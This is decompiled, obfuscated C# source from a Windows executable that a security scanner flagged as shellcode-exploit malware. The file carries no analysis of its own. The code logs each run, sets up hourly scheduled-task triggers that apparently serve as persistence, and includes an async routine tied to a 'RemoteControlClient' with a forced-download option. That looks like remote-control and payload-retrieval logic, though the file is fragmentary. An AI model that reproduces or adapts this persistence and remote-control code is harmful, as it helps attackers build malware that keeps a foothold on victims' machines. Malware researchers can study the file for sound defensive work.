// Decompiled with JetBrains decompiler
// Type: 569990687827.Core.819255704277
// Assembly: 569990687827, Version=14.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a
// MVID: 58118FF0-4F0E-4F7B-A626-B24D4B565FEB
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Exploit.MSIL.Shellcode.gen-23ff706959b1522b1ea60243d4aeb9928372332bce1e128933386bf4f714f8ad.exe

using \u003210067131537;
using \u003325449573288;
using \u003569990687827.Core;
using \u003569990687827.Utils;
using \u003823387107881;
using \u003919702849670;
using Microsoft.Win32.TaskScheduler;
using System;
using System.IO;
using System.Runtime.CompilerServices;

namespace \u003569990687827.Core
{
  public static class \u003819255704277
  {
    public static void \u003269937929382()
    {
      File.WriteAllText(Path.Combine(\u003665425881749.\u003249853457110(), "last-run.log"), string.Format("{0}{1}{1}", (object) DateTime.Now, (object) Environment.NewLine));
      \u003725159542770.\u003537038368806();
      \u003427500725955.\u003806509390851();
    }

    private static TimeTrigger \u003775274279057()
    {
      TimeTrigger timeTrigger = new TimeTrigger();
      ((Trigger) timeTrigger).StartBoundary = new DateTime(2017, 1, 1);
      ((Trigger) timeTrigger).Repetition.Interval = TimeSpan.FromHours(1.0);
      ((Trigger) timeTrigger).Repetition.StopAtDurationEnd = false;
      ((Trigger) timeTrigger).Enabled = true;
      return timeTrigger;
    }

    private static TimeTrigger \u003782083291378()
    {
      DateTime dateTime = DateTime.Now.AddDays(1.0);
      return new TimeTrigger(new DateTime(dateTime.Year, dateTime.Month, dateTime.Day, 0, 0, 1));
    }

    private void \u003887235604579()
    {
      // ISSUE: reference to a compiler-generated field
      int num1 = ((\u003019420258235) this).\u003046018584174;
      // ISSUE: reference to a compiler-generated field
      \u003796840840385 obj = ((\u003796840840385.\u003174068052347) this).\u003892307510441;
      Stream result1;
      try
      {
        ConfiguredTaskAwaitable<\u003083528900411>.ConfiguredTaskAwaiter awaiter1;
        int num2;
        ConfiguredTaskAwaitable<\u003083528900411>.ConfiguredTaskAwaiter awaiter2;
        ConfiguredTaskAwaitable<\u003083528900411>.ConfiguredTaskAwaiter awaiter3;
        ConfiguredTaskAwaitable<\u003083528900411>.ConfiguredTaskAwaiter awaiter4;
        switch (num1)
        {
          case 0:
            // ISSUE: reference to a compiler-generated field
            awaiter1 = ((\u003796840840385.\u003174068052347) this).\u003320291904331;
            // ISSUE: reference to a compiler-generated field
            ((\u003796840840385.\u003174068052347) this).\u003320291904331 = new ConfiguredTaskAwaitable<\u003083528900411>.ConfiguredTaskAwaiter();
            // ISSUE: reference to a compiler-generated field
            ((\u003019420258235) this).\u003046018584174 = num2 = -1;
            break;
          case 1:
            // ISSUE: reference to a compiler-generated field
            awaiter2 = ((\u003796840840385.\u003174068052347) this).\u003320291904331;
            // ISSUE: reference to a compiler-generated field
            ((\u003796840840385.\u003174068052347) this).\u003320291904331 = new ConfiguredTaskAwaitable<\u003083528900411>.ConfiguredTaskAwaiter();
            // ISSUE: reference to a compiler-generated field
            ((\u003019420258235) this).\u003046018584174 = num2 = -1;
            goto label_15;
          case 2:
            // ISSUE: reference to a compiler-generated field
            awaiter3 = ((\u003796840840385.\u003174068052347) this).\u003320291904331;
            // ISSUE: reference to a compiler-generated field
            ((\u003796840840385.\u003174068052347) this).\u003320291904331 = new ConfiguredTaskAwaitable<\u003083528900411>.ConfiguredTaskAwaiter();
            // ISSUE: reference to a compiler-generated field
            ((\u003019420258235) this).\u003046018584174 = num2 = -1;
            goto label_19;
          case 3:
            // ISSUE: reference to a compiler-generated field
            awaiter4 = ((\u003796840840385.\u003174068052347) this).\u003320291904331;
            // ISSUE: reference to a compiler-generated field
            ((\u003796840840385.\u003174068052347) this).\u003320291904331 = new ConfiguredTaskAwaitable<\u003083528900411>.ConfiguredTaskAwaiter();
            // ISSUE: reference to a compiler-generated field
            ((\u003019420258235) this).\u003046018584174 = num2 = -1;
            goto label_25;
          default:
            if (obj.\u003472558713770)
            {
              result1 = (Stream) null;
              goto label_28;
            }
            else
            {
              if (obj.\u003750528346248)
                throw new ObjectDisposedException("RemoteControlClient");
              if (obj.\u003138050282908.\u003259581639358)
              {
                awaiter1 = obj.\u003451656068848().ConfigureAwait(false).GetAwaiter();
                if (!awaiter1.IsCompleted)
                {
                  // ISSUE: reference to a compiler-generated field
                  ((\u003019420258235) this).\u003046018584174 = num2 = 0;
                  // ISSUE: reference to a compiler-generated field
                  ((\u003796840840385.\u003174068052347) this).\u003320291904331 = awaiter1;
                  // ISSUE: reference to a compiler-generated field
                  // ISSUE: cast to a reference type
                  ((\u003796840840385.\u003174068052347) this).\u003892626938300.AwaitUnsafeOnCompleted<ConfiguredTaskAwaitable<\u003083528900411>.ConfiguredTaskAwaiter, \u003796840840385.\u003174068052347>(ref awaiter1, (\u003796840840385.\u003174068052347&) this);
                  return;
                }
                break;
              }
              // ISSUE: reference to a compiler-generated field
              switch (((\u003796840840385.\u003174068052347) this).\u003034731778684)
              {
                case \u003189302834131.ReturnStale:
                  awaiter2 = obj.\u003517114206832().ConfigureAwait(false).GetAwaiter();
                  if (!awaiter2.IsCompleted)
                  {
                    // ISSUE: reference to a compiler-generated field
                    ((\u003019420258235) this).\u003046018584174 = num2 = 1;
                    // ISSUE: reference to a compiler-generated field
                    ((\u003796840840385.\u003174068052347) this).\u003320291904331 = awaiter2;
                    // ISSUE: reference to a compiler-generated field
                    // ISSUE: cast to a reference type
                    ((\u003796840840385.\u003174068052347) this).\u003892626938300.AwaitUnsafeOnCompleted<ConfiguredTaskAwaitable<\u003083528900411>.ConfiguredTaskAwaiter, \u003796840840385.\u003174068052347>(ref awaiter2, (\u003796840840385.\u003174068052347&) this);
                    return;
                  }
                  goto label_15;
                case \u003189302834131.ReturnNull:
                  awaiter3 = obj.\u003517114206832().ConfigureAwait(false).GetAwaiter();
                  if (!awaiter3.IsCompleted)
                  {
                    // ISSUE: reference to a compiler-generated field
                    ((\u003019420258235) this).\u003046018584174 = num2 = 2;
                    // ISSUE: reference to a compiler-generated field
                    ((\u003796840840385.\u003174068052347) this).\u003320291904331 = awaiter3;
                    // ISSUE: reference to a compiler-generated field
                    // ISSUE: cast to a reference type
                    ((\u003796840840385.\u003174068052347) this).\u003892626938300.AwaitUnsafeOnCompleted<ConfiguredTaskAwaitable<\u003083528900411>.ConfiguredTaskAwaiter, \u003796840840385.\u003174068052347>(ref awaiter3, (\u003796840840385.\u003174068052347&) this);
                    return;
                  }
                  goto label_19;
                case \u003189302834131.ForceDownload:
                  awaiter4 = obj.\u003517114206832(true).ConfigureAwait(false).GetAwaiter();
                  if (!awaiter4.IsCompleted)
                  {
                    // ISSUE: reference to a compiler-generated field
                    ((\u003019420258235) this).\u003046018584174 = num2 = 3;
                    // ISSUE: reference to a compiler-generated field
                    ((\u003796840840385.\u003174068052347) this).\u003320291904331 = awaiter4;
                    // ISSUE: reference to a compiler-generated field
                    // ISSUE: cast to a reference type
                    ((\u003796840840385.\u003174068052347) this).\u003892626938300.AwaitUnsafeOnCompleted<ConfiguredTaskAwaitable<\u003083528900411>.ConfiguredTaskAwaiter, \u003796840840385.\u003174068052347>(ref awaiter4, (\u003796840840385.\u003174068052347&) this);
                    return;
                  }
                  goto label_25;
                default:
                  result1 = (Stream) null;
                  goto label_28;
              }
            }
        }
        result1 = awaiter1.GetResult().\u003109862577938;
        goto label_28;
label_15:
        result1 = awaiter2.GetResult().\u003109862577938;
        goto label_28;
label_19:
        \u003083528900411 result2 = awaiter3.GetResult();
        if (obj.\u003438584493470(result2))
        {
          result1 = result2.\u003109862577938;
          goto label_28;
        }
        else
        {
          result2.\u003799201744468();
          result1 = (Stream) null;
          goto label_28;
        }
label_25:
        result1 = awaiter4.GetResult().\u003109862577938;
      }
      catch (Exception ex)
      {
        // ISSUE: reference to a compiler-generated field
        ((\u003019420258235) this).\u003046018584174 = -2;
        // ISSUE: reference to a compiler-generated field
        ((\u003796840840385.\u003174068052347) this).\u003892626938300.SetException(ex);
        return;
      }
label_28:
      // ISSUE: reference to a compiler-generated field
      ((\u003019420258235) this).\u003046018584174 = -2;
      // ISSUE: reference to a compiler-generated field
      ((\u003796840840385.\u003174068052347) this).\u003892626938300.SetResult(result1);
    }
  }
}
